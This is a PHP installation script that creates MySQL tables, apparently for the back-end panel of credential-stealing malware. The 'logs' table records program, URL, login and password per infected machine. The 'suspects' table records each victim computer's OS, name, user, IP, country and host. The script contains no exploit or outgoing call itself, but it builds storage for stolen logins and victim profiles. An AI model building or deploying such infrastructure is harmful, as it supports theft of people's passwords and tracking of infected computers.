<?php

  include 'config.php';
	
	// ********************************************************************************************

	// FUNCTIONS **********************************************************************************
	function connect_database() {
		global $dbHost, $dbUser, $dbPass, $dbDatabase, $html, $header, $footer;
		$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
		if (!$mysql) {
			$html = "Database Error".$header."Can not connect to database, please check the configuration.".$footer;
			die($html);
		}
		if (!mysql_select_db($dbDatabase, $mysql)) {
			mysql_close($mysql);
			$html = "Database Error".$header."Can not select '".$dbDatabase."' database, please check the configuration.".$footer;
			die($html);
		}
		return $mysql;
	}

	// Install ************************************************************************************
	$mysql = connect_database();

	$result = mysql_query("SELECT COUNT(*) FROM `logs`;", $mysql);
	if (!$result) {
		$result = mysql_query("CREATE TABLE `logs` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `program` INT NOT NULL, `url` 
					VARCHAR(150) NOT NULL, `login` VARCHAR(50) NOT NULL, `pass` VARCHAR(50) NOT NULL, `compid` VARCHAR(50) NOT NULL, `date` 
					DATETIME NOT NULL, `ip` VARCHAR(15) NOT NULL);", $mysql);
		if (!$result) {
			$html = "Database Error".$header."Can not create table 'logs', please check the configuration and your privileges.".$footer;
			die($html);
		}
	  else {
	    $html = "Created table logs.";
		}
	}

	$result = mysql_query("SELECT COUNT(*) FROM `suspects`;", $mysql);
	if (!$result) {
		$result = mysql_query("CREATE TABLE `suspects` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `compid` VARCHAR(50) NOT NULL, `os` 
					VARCHAR(50) NOT NULL, `computer` VARCHAR(50) NOT NULL, `user` VARCHAR(50) NOT NULL, `install` INT NOT NULL, `date` 
					DATETIME NOT NULL, `ip` VARCHAR(15) NOT NULL, country VARCHAR(50) NOT NULL, host VARCHAR(100) NOT NULL);", $mysql);
		if (!$result) {
			$html = "Database Error".$header."Can not create table 'suspects', please check the configuration and your privileges.".$footer;
			die($html);
		}
	  else {
	    $html .= " Created table suspects.";
		}
	}

  $html .= " Do not forget to download http://ip-to-country.webhosting.info/ . Please remove this installation script install.php now for security reasons.";
  echo $html;
	mysql_close($mysql);
?>
